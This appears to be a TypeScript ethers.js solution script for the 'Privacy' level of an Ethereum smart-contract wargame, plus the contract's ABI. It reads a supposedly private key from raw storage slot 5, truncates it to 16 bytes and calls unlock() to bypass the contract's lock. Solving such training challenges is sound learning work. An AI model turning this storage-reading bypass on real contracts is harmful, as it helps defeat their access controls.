// Runtime Environment's members available in the global scope.
import { BigNumber, ethers, Signer, BytesLike } from "ethers";
import { Interface } from "ethers/lib/utils";
import { getSigner } from "./signer";
import { Privacy__factory } from "../typechain/ethers-v5";


async function main() {
  const instanceAddress = "0xdba51C220372f9ca217E6CA628E729C03B20AF9c";
  const signer = getSigner();
  const privacy = Privacy__factory.connect(instanceAddress, signer);
  await privacy.deployed();


  // await tryUnlock(3);
  // await tryUnlock(4);
  await tryUnlock(5);

  async function tryUnlock(position: number) {
    console.log(`unlock position ${position}`);
    const data: BytesLike = await signer.provider?.getStorageAt(instanceAddress, position) || "0x";
    const formatByteData = data.split('').slice(0,34).join('');
    console.log(data, formatByteData)
    await (await privacy.unlock(formatByteData)).wait();
    console.log('result:', await privacy.locked());
  }
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32[3]",
        "name": "_data",
        "type": "bytes32[3]"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ID",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xb3cea217"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xcf309012"
  },
  {
    "inputs": [
      {
        "internalType": "bytes16",
        "name": "_key",
        "type": "bytes16"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xe1afb08c"
  }
]